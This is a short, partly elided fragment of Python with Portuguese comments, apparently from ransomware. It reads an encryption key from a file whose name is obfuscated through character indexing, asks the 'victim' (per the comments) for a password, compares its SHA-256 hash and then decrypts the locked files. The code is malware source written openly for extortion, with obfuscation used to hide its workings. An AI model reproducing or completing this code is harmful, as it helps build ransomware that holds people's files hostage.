...
# ACÇÃO PARA LER A CHAVE CRIPTOGRAFICA GURDADA NUM FICHEIRO

with open(a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25], a[18]+a[2]) as key: 
        secretkey = key.read()
        
# AÇÃO PARA CRIAR UMA PASSWORD, POR FORMA A QUE ESTA, QUANDO FOR ESCRITA PELA VITIMA, ACIONE A ACÇÃO QUE VAI DECRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05
...
s03 = getpass.getpass("\nDigite a Password para Decriptar os Ficheiros\n") 
s02 = hashlib.sha256(s03.encode())

if s02.hexdigest() == s04: 

# ACÇÃO QUE VAI DECRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFICA GUARDADA NUM FICHEIRO
        ...
        for file in s05: 
                ...
                print('\033[32m'+"Ficheiro:", file,"----> decriptografado"+'\033[0;0m')
